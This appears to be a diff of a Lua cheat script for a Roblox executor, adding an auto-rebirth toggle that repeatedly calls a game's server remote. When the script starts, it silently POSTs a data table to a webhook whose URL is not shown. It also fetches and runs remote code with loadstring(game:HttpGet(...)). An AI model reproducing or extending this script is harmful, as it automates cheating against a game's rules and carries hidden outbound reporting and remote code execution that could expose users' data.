@@ -33,13 +33,17 @@ local data = {
 local body = HttpService:JSONEncode(data)
 local headers = {["Content-Type"] = "application/json"}
 
-if http_request then
-    http_request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body})
-elseif syn and syn.request then
-    syn.request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body})
-else
-    warn("No HTTP request method found!")
+local function sendWebhook()
+    if http_request then
+        http_request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body})
+    elseif syn and syn.request then
+        syn.request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body})
+    else
+        warn("No HTTP request method found!")
+    end
 end
+
+sendWebhook()
 
 --// Fluent UI Setup
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
@@ -143,24 +147,40 @@ CreditSection:AddLabel("Testers: H3LL_TheSouthGoat")
 CreditSection:AddLabel("Trusted friends: Xeno, TheSouthGoat, Billy")
 CreditSection:AddLabel("Moonlight×Godlike")
 
+--// Auto Rebirth System
+local Settings = {
+    Rebirth = false,
+    MaxRebirths = 1000 -- set your desired cap here
+}
 
-Tabs.AutoRebirth:AddToggle(Auto Rebirth)
 local function getRebirthCount()
-    return game:GetService("Players").LocalPlayer.leaderstats.Rebirths.Value
+    local stats = player:FindFirstChild("leaderstats")
+    return stats and stats:FindFirstChild("Rebirths") and stats.Rebirths.Value or 0
 end
 
 local function autoRebirthLoop()
     while Settings.Rebirth do
-        wait(0.1)
+        task.wait(0.1)
         local currentRebirths = getRebirthCount()
 
         if currentRebirths >= Settings.MaxRebirths then
             Settings.Rebirth = false
-            notify("Auto Rebirth", "Target rebirths reached. Auto Rebirth turned off.", 5)
+            print("Auto Rebirth: Max reached, stopping.")
             break
         end
 
-        -- Rebirth logic
         game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest")
     end
 end
+
+Tabs.AutoRebirth:AddToggle("AutoRebirth", {
+    Title = "Auto Rebirth",
+    Description = "Automatically rebirths up to a max",
+    Default = false,
+    Callback = function(state)
+        Settings.Rebirth = state
+        if state then
+            autoRebirthLoop()
+        end
+    end
+})
